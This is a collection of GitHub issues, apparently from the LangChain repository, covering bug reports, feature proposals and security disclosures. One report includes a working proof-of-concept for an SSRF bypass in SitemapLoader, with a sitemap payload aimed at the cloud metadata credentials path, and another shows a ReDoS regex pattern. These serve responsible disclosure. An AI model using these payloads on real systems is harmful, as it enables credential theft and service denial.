title: Community tool: Sonomp music submission tools
author: entexwho
body:
## Summary
Sonomp is an AI music discovery platform. We published LangChain-compatible tools so agents can register, read a daily vibe, and submit tracks for human Arena ranking.

## Install
```bash
pip install "sonomp[langchain] @ git+https://github.com/entexwho/sonomc.git#subdirectory=integrations/python"
# or after PyPI: pip install 'sonomp[langchain]'
```

## Usage
```python
from sonomp.tools.langchain import create_sonomp_tools
tools = create_sonomp_tools()
```

## Links
- Repo: https://github.com/entexwho/sonomc/tree/main/integrations/python
- Manifest: https://app.sonomp.com/.well-known/ai-plugin.json
- OpenAPI: https://app.sonomp.com/api/v1/openapi.yaml
- Docs: https://app.sonomp.com/developers
- Contest: https://app.sonomp.com/contest

Happy to follow any preferred LangChain community tools listing process.

title: Release attestations are disabled by a workaround that cites gh-action-pypi-publish v1.11.0, but the action is pinned to v1.14.0
author: kobihikri
body:
Hi — small one about release provenance.

`_release.yml` disables attestations in two places (lines 577 and 862):

```yaml
# Temp workaround since attestations are on by default as of gh-action-pypi-publish v1.11.0
attestations: false
```

The comment cites v1.11.0, but the action is pinned to `cef221092ed1bacb1cc03d23a2d87d1d172e277b`, which is **v1.14.0**. So the reason given no longer matches the version in use.

The effect is that published wheels carry no provenance:

```
$ curl -s -o /dev/null -w "%{http_code}" https://pypi.org/integrity/langchain/1.3.13/langchain-1.3.13-py3-none-any.whl/provenance
404
```

For comparison, `huggingface/transformers` pins the **same action at the same SHA** and simply doesn't set `attestations: false`:

```
$ curl -s -o /dev/null -w "%{http_code}" https://pypi.org/integrity/transformers/5.13.1/transformers-5.13.1-py3-none-any.whl/provenance
200
```

Trusted Publishing already looks correctly configured here (`id-token: write`, `environment: Release`), so it may be that removing those two lines is all that's needed now.

I couldn't find any issue or discussion where attestations were turned down on purpose, so I may well be missing context — happy to be told this is intentional. I'd rather raise it as an issue than send a PR into release infrastructure uninvited.

*(Checked at `233e02a8223234de731dda8f47152fa6c6a40535`. Written with AI assistance.)*

title: SSRF via recursive sitemap fetch in `SitemapLoader` — `restrict_to_same_domain` is not enforced on nested `<sitemap>` entries
author: geo-chen
body:
### Submission checklist

- [x] This is a bug, not a usage question.
- [x] I added a clear and descriptive title that summarizes this issue.
- [x] I used the GitHub search to find a similar question and didn't find it.
- [x] I am sure that this is a bug in LangChain rather than my code.
- [x] The bug is not resolved by updating to the latest stable version of LangChain (or the specific integration package).
- [x] This is not related to the langchain-community package.
- [x] I posted a self-contained, minimal, reproducible example. A maintainer can copy it and run it AS IS.

### Package (Required)

- [x] langchain
- [ ] langchain-openai
- [ ] langchain-anthropic
- [ ] langchain-classic
- [ ] langchain-core
- [ ] langchain-model-profiles
- [ ] langchain-tests
- [ ] langchain-text-splitters
- [ ] langchain-chroma
- [ ] langchain-deepseek
- [ ] langchain-exa
- [ ] langchain-fireworks
- [ ] langchain-groq
- [ ] langchain-huggingface
- [ ] langchain-mistralai
- [ ] langchain-nomic
- [ ] langchain-ollama
- [ ] langchain-openrouter
- [ ] langchain-perplexity
- [ ] langchain-qdrant
- [ ] langchain-xai
- [ ] Other / not sure / general

### Related Issues / PRs

reported via email on 9 June 2026 - no response, thus trying here.

### Reproduction Steps / Example Code (Python)

```python
## PoC 

`poc_sitemap_ssrf.py` — an "allowed-domain" server serves the malicious sitemap; an "internal" server stands in for a metadata host. With `restrict_to_same_domain=True` and the loader pointed only at the allowed domain:

restrict_to_same_domain=True ; internal host hits: ['/latest/meta-data/iam/security-credentials/']
SSRF CONFIRMED — same-domain restriction BYPASSED



poc_sitemap_ssrf.py:

"""
PoC: SSRF / restrict_to_same_domain bypass in langchain_community SitemapLoader.

Root cause:
  langchain_community/document_loaders/sitemap.py :: SitemapLoader.parse_sitemap()
  - For <url> leaf entries, restrict_to_same_domain filters out cross-domain locs.
  - For nested <sitemap> entries (~L194-200), the child <loc> URL is fetched
    *recursively* via self.scrape_all([loc.text], "xml") with NO domain check and
    NO SSRF/internal-IP guard -> aiohttp session.get() to any host.
Requires: pip install langchain-community
Run:      python poc_sitemap_ssrf.py   (expects "SSRF CONFIRMED")
"""
import threading, http.server, socketserver, time

INTERNAL_HITS = []
PUBLIC_PORT = 8401
INTERNAL_PORT = 8402

MALICIOUS_SITEMAP = f"""<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <sitemap><loc>http://127.0.0.1:{INTERNAL_PORT}/latest/meta-data/iam/security-credentials/</loc></sitemap>
</sitemapindex>"""

INTERNAL_SECRET = """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>http://internal-only/SECRET-AWS-CREDENTIALS-LEAKED</loc></url>
</urlset>"""

class Pub(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","application/xml"); self.end_headers()
        self.wfile.write(MALICIOUS_SITEMAP.encode())
    def log_message(self,*a): pass

class Int(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        INTERNAL_HITS.append(self.path)
        self.send_response(200); self.send_header("Content-Type","application/xml"); self.end_headers()
        self.wfile.write(INTERNAL_SECRET.encode())
    def log_message(self,*a): pass

class S(socketserver.TCPServer): allow_reuse_address = True
_srv = []
def serve(port, h):
    httpd = S(("127.0.0.1", port), h); _srv.append(httpd); httpd.serve_forever()

def main():
    threading.Thread(target=serve, args=(PUBLIC_PORT, Pub), daemon=True).start()
    threading.Thread(target=serve, args=(INTERNAL_PORT, Int), daemon=True).start()
    time.sleep(0.5)
    from langchain_community.document_loaders.sitemap import SitemapLoader
    loader = SitemapLoader(web_path=f"http://127.0.0.1:{PUBLIC_PORT}/sitemap.xml",
                           restrict_to_same_domain=True, continue_on_failure=True)
    loader.load()
    print("restrict_to_same_domain=True ; internal host hits:", INTERNAL_HITS)
    print("SSRF CONFIRMED — same-domain restriction BYPASSED" if INTERNAL_HITS else "no SSRF")
    for s in _srv: s.shutdown()
    raise SystemExit(0 if INTERNAL_HITS else 1)

if __name__ == "__main__":
    main()
```

### Error Message and Stack Trace (if applicable)

```shell

```

### Description

## Summary

`SitemapLoader` applies its documented `restrict_to_same_domain` control only to leaf `<url><loc>` entries, but recursively **fetches** nested `<sitemap><loc>` (sitemap-index) URLs with no domain check and no internal-IP/SSRF guard. An attacker who controls or influences an ingested sitemap can make the server fetch arbitrary internal URLs (cloud metadata, internal services, port scan) — even when the deploying app set `restrict_to_same_domain=True` specifically to confine fetches.

## Details

`document_loaders/sitemap.py`, `SitemapLoader.parse_sitemap()`:
- leaf loop `for url in soup.find_all("url")` (~L166) applies `restrict_to_same_domain` (~L174).
- nested loop `for sitemap in soup.find_all("sitemap")` (~L194): the child `<loc>` is fetched recursively at **L199** `soup_child = self.scrape_all([loc.text], "xml")[0]` → `WebBaseLoader.scrape_all` → `aiohttp session.get(url)` (web_base.py). No domain/SSRF check on this path.

A sitemap body:
```xml
<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <sitemap><loc>http://169.254.169.254/latest/meta-data/iam/security-credentials/</loc></sitemap>
</sitemapindex>
```
causes a server-side GET to the metadata host; fetched internal content also surfaces back in returned Documents (exfiltration).


## Impact

Any app that ingests a user-influenced sitemap (RAG "add this site" features) can be made to reach internal-only hosts / cloud metadata; the explicit same-domain restriction does not protect the recursive fetch.

## Net-new

Distinct from prior langchain advisories: GHSA-3hjh-jh2h-vrg6 is the same method but a **DoS** (infinite recursion, fixed via `max_depth` — added no domain/SSRF guard); GHSA-q25c-c977-4cmh (WebResearchRetriever) and GHSA-h5gc-rm8j-5gpr (RequestsToolkit) are different components; GHSA-pc6w-59fv-rh23 (XXE) is EverNoteLoader. No advisory covers the `SitemapLoader` recursive-fetch same-domain bypass. Not a by-design code-exec tool (it's a data loader).

## Remediation

Apply the `restrict_to_same_domain` check (and an internal-IP/scheme SSRF guard) to the nested `<sitemap><loc>` URL before the recursive `scrape_all`, identical to the leaf-`<url>` path.

## Secondary (noted, lower)

`document_loaders/docugami.py:153,277` uses `etree.parse()` with lxml's default parser (no `resolve_entities=False`) — potential XXE on a user-supplied DGML file; weaker attacker reachability, not claimed as the primary finding.

### System Info

title: merge_dicts silently discards a differing `index` value when it starts with `lc_`, instead of checking it against the equality it's meant to test for
author: ErenAta16
body:
`merge_dicts` in `langchain_core/utils/_merge.py` has a special-case guard for the `index` key, sitting right next to a very similar guard for `id`/`output_version`/`model_provider`:

```python
if (right_k == "index" and merged[right_k].startswith("lc_")) or (
    right_k in {"id", "output_version", "model_provider"}
    and merged[right_k] == right_v
):
    continue
merged[right_k] += right_v
```

The second clause (`id`/`output_version`/`model_provider`) only skips the merge when the two values are actually *equal* - that's the correct guard for "don't double up an already-identical field."

The first clause (`index`) doesn't check equality with `right_v` at all. It only checks whether the **left** value happens to start with `"lc_"` (LangChain's synthetic per-block ID prefix, per `messages/content.py`: `` Generated by LangChain upon creation (`UUID4` prefixed with `'lc_'`) ``). If it does, the branch continues unconditionally - discarding `right_v` completely, whatever it is, instead of only doing that when `right_v` is the same value.

## Repro

```python
from langchain_core.utils._merge import merge_dicts

left = {"index": "lc_11111111-1111-1111-1111-111111111111", "text": "first block"}
right = {"index": "lc_22222222-2222-2222-2222-222222222222", "text": "second block"}

print(merge_dicts(left, right))
# {'index': 'lc_11111111-1111-1111-1111-111111111111', 'text': 'first blocksecond block'}
```

Two dicts carrying **different** synthetic block IDs get merged into one entry under the *first* ID, with their `text` silently concatenated - the second block's identity is gone, and content that belonged to two separate blocks is now indistinguishable from content that belonged to one.

A nested version, showing this isn't confined to the top-level list-merge path:

```python
left = {"metadata": {"index": "lc_11111111-1111-1111-1111-111111111111", "text": "first block"}}
right = {"metadata": {"index": "lc_22222222-2222-2222-2222-222222222222", "text": "second block"}}
print(merge_dicts(left, right))
# {'metadata': {'index': 'lc_1111...', 'text': 'first blocksecond block'}}
```

`merge_dicts` recurses into nested dicts (`elif isinstance(merged[right_k], dict): merged[right_k] = merge_dicts(...)`), so this triggers anywhere an `index` key with an `lc_`-prefixed value shows up inside a nested structure - not just in the top-level content-block list that `merge_lists` pre-filters.

## Why the primary path (mostly) masks this

`merge_lists` only calls `merge_dicts` on two block-dicts after it's already confirmed `e_left["index"] == e["index"]` matches. Since real content blocks each get their *own* freshly-generated `lc_<uuid4>` when a provider doesn't supply a native index, that pre-filter means genuinely different blocks essentially never reach `merge_dicts` together through that path - they get `.append()`-ed as separate entries instead, which is correct. So the top-level streaming path for content blocks is protected almost by accident, not because the guard itself is correct.

But `merge_dicts` is a public, directly-exported function called elsewhere too - recursively for nested dicts, and directly on `additional_kwargs`/`response_metadata` in `messages/base.py`, `messages/ai.py`, and others - with no contract anywhere requiring callers to pre-verify index equality first. Anywhere an `index` key with an `lc_`-prefixed value can appear inside one of those (nested provider metadata, a future integration, etc.), this silently loses data instead of raising or merging it correctly.

## Suggested fix

Make the `index` guard check equality, the same way the `id`/`output_version`/`model_provider` guard does:

```python
if (
    right_k == "index"
    and isinstance(merged[right_k], str)
    and merged[right_k].startswith("lc_")
    and merged[right_k] == right_v
) or (
    right_k in {"id", "output_version", "model_provider"}
    and merged[right_k] == right_v
):
    continue
merged[right_k] += right_v
```

With that change, identical `lc_`-prefixed indices still get deduplicated (the original intent, avoiding `"lc_1" + "lc_1"` -> `"lc_1lc_1"` garbage), but genuinely different ones fall through to the `TypeError`-raising branches below instead of silently vanishing - which at least surfaces the conflict instead of quietly corrupting data. I'd lean toward that over `+=`-concatenating them, since concatenating two UUIDs into one string index isn't meaningful either.

Tested against current `master` (confirmed `libs/core/langchain_core/utils/_merge.py` is unchanged from what's in this report, I fetched it fresh right before writing this up given how much this function has been touched recently - #38393, #38366, #36993, #34807, #34671 are all in the same function but none of them touch this particular `index`/`lc_` clause).

Happy to send a PR for the fix above if that direction looks right - wanted to flag the exact scope first since this file's seen a lot of concurrent changes lately and I didn't want to step on anything in flight.

title: bug(core): `convert_to_openai_messages` mutates caller's `message.content` when adding fallback filename
author: rahulrao85
body:
### Description

When `convert_to_openai_messages()` encounters a file-type content block without a `filename`, it mutates the caller's original message by injecting `"LC_AUTOGENERATED"` as the filename.

### Root Cause

In `libs/core/langchain_core/messages/utils.py` line 1787-1789:

```python
if block.get("file", {}).get("filename") is None:
    logger.info("Generating a fallback filename.")
    block["file"]["filename"] = "LC_AUTOGENERATED"
```

`block` is a direct reference from the caller's `message.content` list (iterated at line 1685: `for j, block in enumerate(message.content)`). Mutating `block["file"]["filename"]` modifies the caller's original `BaseMessage.content` in-place — every call adds a key the caller never set.

### Reproduction

```python
from langchain_core.messages import HumanMessage
from langchain_core.messages.utils import convert_to_openai_messages

msg = HumanMessage(
    content=[
        {
            "type": "file",
            "file": {"file_data": "base64data", "filename": None},
        }
    ]
)

original_content = msg.content[0]["file"].copy()
convert_to_openai_messages([msg])

# BUG: Original message now has "LC_AUTOGENERATED" as filename
assert msg.content[0]["file"]["filename"] == "LC_AUTOGENERATED", "Caller's message was mutated!"
```

### Expected Behavior

The caller's original messages should not be modified as a side effect of conversion.

### Proposed Fix

Don't mutate the original block. Either deep-copy or build a new dict:

```python
if block.get("file", {}).get("filename") is None:
    logger.info("Generating a fallback filename.")
    block = block.copy()  # shallow copy for the current scope
    block["file"] = block["file"].copy()
    block["file"]["filename"] = "LC_AUTOGENERATED"
```

title: bug(core): `merge_message_runs` destroys original message `response_metadata` via `.clear()` on shallow copy
author: rahulrao85
body:
### Description

When `merge_message_runs()` merges consecutive messages of the same type, it destroys the original message's `response_metadata` as a side effect.

### Root Cause

In `libs/core/langchain_core/messages/utils.py`, `merge_message_runs` calls `_msg_to_chunk()` to convert each message to its chunk variant:

```python
last_chunk = _msg_to_chunk(last)
curr_chunk = _msg_to_chunk(msg)
if curr_chunk.response_metadata:
    curr_chunk.response_metadata.clear()
```

`_msg_to_chunk()` at line 2149 constructs the chunk via:
```python
chunk_cls(**message.model_dump(exclude={"type"}))
```

Pydantic v2's `model_dump()` returns shallow references for mutable fields like `dict[Any, Any]`. The chunk's `response_metadata` is the **same dict object** as the original message's `response_metadata`. Calling `.clear()` on it silently wipes the caller's original metadata.

### Reproduction

```python
from langchain_core.messages import AIMessage
from langchain_core.messages.utils import merge_message_runs

msg1 = AIMessage(content="Hello", response_metadata={"foo": "bar"})
msg2 = AIMessage(content=" World", response_metadata={"baz": "qux"})

merged = merge_message_runs([msg1, msg2])

# BUG: msg1.response_metadata is now empty!
assert msg1.response_metadata == {}, "Original metadata was destroyed!"
```

### Expected Behavior

The original messages passed to `merge_message_runs` should remain unmodified.

### Proposed Fix

Replace `.clear()` with reassignment:

```python
if curr_chunk.response_metadata:
    curr_chunk.response_metadata = {}
```

title: Email PIIMiddleware fails to detect email addresses when preceded by Chinese characters
author: huanyue6660
body:

### Related Issues / PRs

_No response_

### Reproduction Steps / Example Code (Python)

```python
from langchain.agents import create_agent
from langchain.agents.middleware import PIIMiddleware

agent = create_agent(
    model=model,
    middleware=[
        PIIMiddleware("email",strategy="redact", apply_to_input=True)
    ],
)

result = agent.invoke({
    "messages": [{"role": "user", "content": "我的邮箱是123@qq.com"}]
})
print(result)
```

### Error Message and Stack Trace (if applicable)

```shell

```

### Description

## Description

The built-in email detector fails to detect email addresses when they are immediately preceded by CJK characters.

### Reproduction

```python
from langchain.agents.middleware import PIIMiddleware
from langchain.agents import create_agent

agent = create_agent(
    model=model,
    middleware=[
        PIIMiddleware("email", apply_to_input=True)
    ],
)

agent.invoke({
    "messages": [
        {
            "role": "user",
            "content": "我的邮箱是123@qq.com"
        }
    ]
})
```

The email is **not detected**.

However:

```text
我的邮箱：123@qq.com
```

is detected correctly.

### Root Cause

The built-in detector currently uses:

```python
pattern = r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
```

Python's `\b` relies on Unicode word boundaries.

Since Chinese characters (e.g. `是`) are considered word characters, there is **no word boundary** between:

```
是123@qq.com
```

Therefore the regex never matches.

### Expected behavior

The email should be detected regardless of whether it is preceded by ASCII or CJK characters.

### Environment

- langchain==1.3.12
- Python 3.x

### System Info

------------------
> OS:  Windows
> OS Version:  10.0.18362
> Python Version:  3.11.9 (tags/v3.11.9:de54cf5, Apr  2 2024, 10:12:12) [MSC v.1938 64 bit (AMD64)]

title: `_parse_input` silently drops required fields resolved via `validation_alias` in `args_schema`
author: charan16
body:
### Submission checklist

### Package (Required)

- [ ] langchain

- [ ] langchain-xai
- [ ] Other / not sure / general

### Related Issues / PRs

#31035, #14663, #34384, #34399

### Reproduction Steps / Example Code (Python)

```python
from typing import Optional
from pydantic import AliasChoices, BaseModel, ConfigDict, Field
from langchain_core.tools import tool


class MyToolInput(BaseModel):
    """Tool input with validation_alias to accept both 'query_text' and 'query'."""
    model_config = ConfigDict(populate_by_name=True)

    query_text: str = Field(
        description="The user query.",
        validation_alias=AliasChoices("query_text", "query"),
    )


@tool(args_schema=MyToolInput)
def my_tool(query_text: str = None) -> str:
    """A simple tool."""
    return f"query_text={query_text}"


# Works: canonical key
result = my_tool.invoke({"name": "my_tool", "args": {"query_text": "hello"}, "id": "1", "type": "tool_call"})
print(result.content)  # "query_text=hello" ✓

# BUG: aliased key — query_text arrives as None
result = my_tool.invoke({"name": "my_tool", "args": {"query": "hello"}, "id": "2", "type": "tool_call"})
print(result.content)  # "query_text=None" ✗ — should be "query_text=hello"
```

### Error Message and Stack Trace (if applicable)

```shell
No error is raised. The field is **silently dropped** — `query_text` receives its function signature default (`None`) instead of the validated value `"hello"`. This makes debugging extremely difficult.
```

### Description

When a tool's `args_schema` uses `validation_alias` (via `AliasChoices` or a plain alias string), and the LLM sends the aliased key, the resolved field value is silently dropped by `_parse_input()` if the field has no default.

### Root Cause

In `langchain_core/tools/base.py`, `_parse_input()` lines 740-756:

```python
for k in result_dict:
    if k in tool_input:  # line 741
        validated_input[k] = getattr(result, k)
    elif k in field_info and k not in {"args", "kwargs"}:
        fi = field_info[k]
        has_default = (not fi.is_required() ...)
        if has_default:  # line 755
            validated_input[k] = getattr(result, k)
```

When `tool_input = {"query": "hello"}` and pydantic resolves it to `result.query_text = "hello"` via `validation_alias`:

1. Line 711: `model_validate(tool_input)` succeeds — alias resolves correctly
2. Line 712: `result_dict = {"query_text": "hello"}` — correct
3. Line 741: `"query_text" in tool_input` → **False** (original key was `"query"`)
4. Line 750-755: `has_default = not fi.is_required()` → `False` (field is required)
5. **Result**: `query_text` is never added to `validated_input`

The `has_default` gate was introduced in PR #34399 to exclude synthetic `*args`/`**kwargs` fields. 

### Proposed Fix

After `model_validate()` succeeds, any field in `result_dict` has been validated successfully. If it's a real field (not synthetic), it should be included:

```python
for k in result_dict:
    if k in tool_input:
        validated_input[k] = getattr(result, k)
    elif k in field_info and k not in {"args", "kwargs"}:
        validated_input[k] = getattr(result, k)
```

### Workaround

Use a `model_validator(mode="before")` to rename the aliased key in-place. Since pydantic mutates the same dict reference that `_parse_input` holds as `tool_input`, the line 741 check passes:

```python
from pydantic import BaseModel, Field, model_validator

class MyToolInput(BaseModel):
    query_text: str = Field(description="The user query.")

    @model_validator(mode="before")
    @classmethod
    def _normalize_aliases(cls, data: dict) -> dict:
        if "query" in data and "query_text" not in data:
            data["query_text"] = data.pop("query")
        return data
```

### System Info

System Information
------------------
> OS:  Darwin
> OS Version:  Darwin Kernel Version 24.6.0
> Python Version:  3.12.7

Package Information
-------------------
> langchain_core: 1.4.0
> langchain: 1.3.0
> langsmith: 0.8.0
> langgraph: 1.2.0
> pydantic: 2.13.3

author: Suneel-DK
body:

- [ ] Other / not sure / general

### Related Issues / PRs

_No response_

### Reproduction Steps / Example Code (Python)

```python
from langchain_anthropic import ChatAnthropic

model = ChatAnthropic(
    model="claude-sonnet-4-5-20250929",
    anthropic_api_key="dummy",
)

tool_choice = {
    "type": "tool",
    "name": "GetWeather",
}

print("Before:", tool_choice)

model.bind_tools(
    [],
    tool_choice=tool_choice,
    parallel_tool_calls=False,
)

print("After:", tool_choice)
```

### Error Message and Stack Trace (if applicable)

```shell

```

### Description

## Description

`ChatAnthropic.bind_tools()` mutates the caller-provided `tool_choice` dictionary when `parallel_tool_calls=False`.

The mutation happens because the implementation stores a reference to the original dictionary and later adds `disable_parallel_tool_use` to it. Since the caller's dictionary and the internal reference point to the same object, the caller's input is unexpectedly modified.

## Reproduction

```python
from langchain_anthropic import ChatAnthropic

model = ChatAnthropic(
    model="claude-sonnet-4-5-20250929",
    anthropic_api_key="dummy",
)

tool_choice = {
    "type": "tool",
    "name": "GetWeather",
}

print("Before:", tool_choice)

model.bind_tools(
    [],
    tool_choice=tool_choice,
    parallel_tool_calls=False,
)

print("After:", tool_choice)
```

### Current behavior

```python
Before: {'type': 'tool', 'name': 'GetWeather'}

After: {
    'type': 'tool',
    'name': 'GetWeather',
    'disable_parallel_tool_use': True,
}
```

### Expected behavior

The original `tool_choice` dictionary should remain unchanged after calling `bind_tools()`.

```python
{
    "type": "tool",
    "name": "GetWeather",
}
```

## Root cause

The current implementation assigns the caller's dictionary directly:

```python
kwargs["tool_choice"] = tool_choice
```

Later, it modifies the same dictionary:

```python
kwargs["tool_choice"]["disable_parallel_tool_use"] = (
    disable_parallel_tool_use
)
```

Since both variables reference the same object, the caller's input is mutated.

## Proposed solution

Create a shallow copy of the provided dictionary before storing it in `kwargs`:

```python
kwargs["tool_choice"] = tool_choice.copy()
```

This preserves the existing behavior while preventing unexpected mutation of the caller's object.

## Verification

I reproduced the issue locally, implemented the proposed fix, and added a regression test that fails before the fix and passes after it. I also verified that the existing `test_anthropic_bind_tools_tool_choice` test continues to pass.

### System Info

OS:  Windows
> OS Version:  10.0.26200
> Python Version:  3.12.5 (tags/v3.12.5:ff3bc82, Aug  6 2024, 20:45:27) [MSC v.1940 64 bit (AMD64)]

- [ ] Other / not sure / general

### Feature Description

Add AskQuestionMiddleware to langchain.agents.middleware — same pattern as TodoListMiddleware and HumanInTheLoopMiddleware.

The middleware registers an AskQuestion tool that:
- Accepts structured multi-choice questions (single or multi-select)
- Supports optional free-text per option (requires_free_text + placeholder)
- Calls LangGraph interrupt() with a versioned payload (schema_version: "1.1")
- Returns normalized JSON answers to the model after Command(resume=...)

Pydantic schemas: QuestionOption, Question, AskQuestionInput with validation (duplicate ids, min/max select bounds, free-text placeholder rules).

Optional HITLStructuredTool helper: re-raise GraphInterrupt before on_tool_error (related langgraph issues #8218, #8217).

Guard: reject parallel AskQuestion calls in one model turn (same pattern as TodoListMiddleware parallel write_todos guard).

### Use Case

HumanInTheLoopMiddleware handles approval of pending tool calls (approve / edit / reject / respond). It does not cover agents proactively asking structured clarification questions mid-task.

Raw interrupt("some string") inside a tool gives UI consumers no schema to render forms (multi-select, validation, per-option free text).

Agents need a standard way to pause, show structured questions, and resume with typed answers — e.g. clarifying date ranges, report types, or ambiguous user intent without unstructured back-and-forth.

### Proposed Solution

New file: libs/langchain_v1/langchain/agents/middleware/ask_question.py

Export AskQuestionMiddleware from langchain.agents.middleware.

Interrupt payload shape:

{
  "schema_version": "1.1",
  "title": "Clarify your request",
  "context_note": "Optional helper text",
  "questions": [
    {
      "id": "range",
      "prompt": "Which date range?",
      "allow_multiple": false,
      "options": [
        {"id": "7d", "label": "Last 7 days"},
        {"id": "30d", "label": "Last 30 days"},
        {
          "id": "custom",
          "label": "Custom",
          "requires_free_text": true,
          "free_text_placeholder": "Describe the range"
        }
      ]
    }
  ]
}

Usage:

from langchain.agents import create_agent
from langchain.agents.middleware import AskQuestionMiddleware
from langgraph.checkpoint.memory import InMemorySaver

agent = create_agent(
    model,
    middleware=[AskQuestionMiddleware()],
    checkpointer=InMemorySaver(),
)

# Resume: Command(resume='{"range": {"selected": ["7d"]}}')

Unit tests under:
tests/unit_tests/agents/middleware/implementations/test_ask_question.py

### Alternatives Considered

1. HumanInTheLoopMiddleware only — handles tool approval, not agent-driven structured Q&A. Different interrupt payload (HITLRequest vs question form).

2. Raw interrupt() with ad-hoc dict/string — no shared schema, every consumer invents its own format.

3. Unstructured chat — works but poor UX for bounded choices and validation.

4. Custom tool per application — duplicates schema/validation across projects.

### Additional Context

Complements HumanInTheLoopMiddleware; does not replace it.

Related langgraph interrupt tooling issues: #8218, #8217.

I have a draft implementation ready on branch feat/ask-question-middleware (PR #38767 was auto-closed per missing-issue-link policy — will wait for assignment before reopening or opening a new PR).

Happy to adjust API naming or payload schema per maintainer feedback.

title: feat(middleware): AskQuestionMiddleware for structured HITL questions
author: aamar-shahzad
body:
## Problem

Agents often need **structured clarification** from users (single/multi-select, optional free-text per option). Today in LangChain middleware:

- **`HumanInTheLoopMiddleware`** intercepts tool execution for approve/edit/reject/respond — it does not let the model proactively ask structured questions.
- Raw **`interrupt("string")`** inside tools has no versioned schema for UI consumers to render forms.

## Proposal

Add **`AskQuestionMiddleware`** following the same pattern as `TodoListMiddleware`:

- Registers an **`AskQuestion`** tool on the agent
- Tool calls LangGraph **`interrupt()`** with a versioned payload (`schema_version: "1.1"`)
- Graph pauses; UI renders questions; client resumes with `Command(resume=...)`
- Tool returns normalized JSON answers to the model

### Interrupt payload (sketch)

```json
{
  "schema_version": "1.1",
  "title": "Clarify your request",
  "context_note": "Pick a date range before I continue.",
  "questions": [
    {
      "id": "range",
      "prompt": "Which range?",
      "allow_multiple": false,
      "options": [
        {"id": "7d", "label": "Last 7 days"},
        {"id": "30d", "label": "Last 30 days"},
        {"id": "custom", "label": "Custom", "requires_free_text": true, "free_text_placeholder": "Describe the range"}
      ]
    }
  ]
}
```

### Usage

```python
from langchain.agents import create_agent
from langchain.agents.middleware import AskQuestionMiddleware
from langgraph.checkpoint.memory import InMemorySaver

agent = create_agent(
    model,
    middleware=[AskQuestionMiddleware()],
    checkpointer=InMemorySaver(),
)
```

## Relationship to existing middleware

| Middleware | Purpose |
|------------|---------|
| `HumanInTheLoopMiddleware` | Human reviews **pending tool calls** (approve/reject/edit) |
| `AskQuestionMiddleware` | Model **asks structured questions** mid-task |

These are complementary.

## Implementation notes

- Pydantic schemas: `QuestionOption`, `Question`, `AskQuestionInput` with validation (duplicate ids, min/max select, free-text placeholder rules)
- `HITLStructuredTool` helper: re-raise `GraphInterrupt` before `on_tool_error` (related: langgraph #8218, #8217)
- Reject parallel `AskQuestion` calls in one model turn (same guard pattern as `TodoListMiddleware`)

Happy to open a PR if this direction looks good.

## Non-goals

- UI components (consumer responsibility)
- Domain-specific routing rules

title: [FEATURE] Preserve reasoning / reasoning_content field in streaming ChatOpenAI chunks
author: wubo-bo

- [ ] langchain-openrouter
- [ ] langchain-perplexity
- [ ] langchain-qdrant
- [ ] langchain-xai
- [ ] Other / not sure / general

### Feature Description

Many reasoning models (GLM-5, DeepSeek) follow OpenAI compatible API and return `reasoning` or `reasoning_content` in streaming delta chunks to output thinking process.

The native `ChatOpenAI._convert_chunk_to_generation_chunk` only parses `content` and drops these reasoning fields, so upper layer cannot capture the chain-of-thought text.

### Use Case

Many reasoning LLMs like GLM-5 and DeepSeek expose OpenAI-compatible streaming APIs with extra reasoning or reasoning_content fields in deltas to carry chain-of-thought text, yet the native ChatOpenAI discards these fields during chunk parsing, blocking upper applications from fetching and separately streaming thinking content to frontends; currently every user has to implement custom subclasses to capture reasoning text, and native support would eliminate redundant wrapper code for all developers using reasoning-capable models.

### Proposed Solution

Override `_convert_chunk_to_generation_chunk` to extract `reasoning` / `reasoning_content` from delta, accumulate incremental text and store in `AIMessageChunk.additional_kwargs["reasoning_content"]`.

Attached my custom subclass `ReasoningChatOpenAI` as reference implementation.

```python
from typing import Dict, Optional, Type

from langchain_core.messages import AIMessageChunk
from langchain_core.outputs import ChatGenerationChunk
from langchain_openai import ChatOpenAI


class ReasoningChatOpenAI(ChatOpenAI):
    """ChatOpenAI wrapper that preserves reasoning_content / reasoning fields from third-party reasoning models"""

    def _convert_chunk_to_generation_chunk(
            self,
            chunk: dict,
            default_chunk_class: Type,
            base_generation_info: Optional[Dict],
    ) -> Optional[ChatGenerationChunk]:
        def _reasoning_from_delta(delta: dict) -> str:
            """Extract reasoning content from delta, compatible with different vendor response fields"""
            # Compatible with deepseek's reasoning_content and other reasoning fields
            reasoning_text = ""
            if "reasoning_content" in delta:
                reasoning_text = delta["reasoning_content"]
            elif "reasoning" in delta:
                reasoning_text = delta["reasoning"]
            return reasoning_text or ""

        # Call parent class native parsing logic
        generation_chunk = super()._convert_chunk_to_generation_chunk(
            chunk, default_chunk_class, base_generation_info
        )
        if generation_chunk is None:
            return None

        # Support two types of outer chunk structures
        choices = chunk.get("choices", [])
        if not choices and "chunk" in chunk:
            choices = chunk["chunk"].get("choices", [])
        if not choices:
            return generation_chunk

        delta = choices[0].get("delta", {})
        reasoning = _reasoning_from_delta(delta)

        # Append reasoning content to additional_kwargs
        if reasoning and isinstance(generation_chunk.message, AIMessageChunk):
            prev_reason = generation_chunk.message.additional_kwargs.get("reasoning_content", "")
            generation_chunk.message.additional_kwargs["reasoning_content"] = prev_reason + reasoning

        return generation_chunk
```

### Alternatives Considered

Users have to wrap a custom subclass now, which is intrusive for business code. Built-in native support would be better.



### Additional Context

_No response_

title: FileSearchMiddleware Python fallback is vulnerable to ReDoS via user-controlled regex pattern
author: ErenAta16
body:
### Checked other resources

- [x] This is a bug, not a usage question.
- [x] I searched existing issues and did not find a duplicate.

### Example Code

```python
import re
import time

# 6-character pattern -- well within any reasonable length limit
pattern = r"(a+)+$"
regex = re.compile(pattern)

for n in [20, 22, 24, 26]:
    line = "a" * n + "!"  # trailing char forces the match to fail after exhausting backtracking
    start = time.time()
    regex.search(line)
    print(f"n={n}: {time.time() - start:.4f}s")
```

### Description

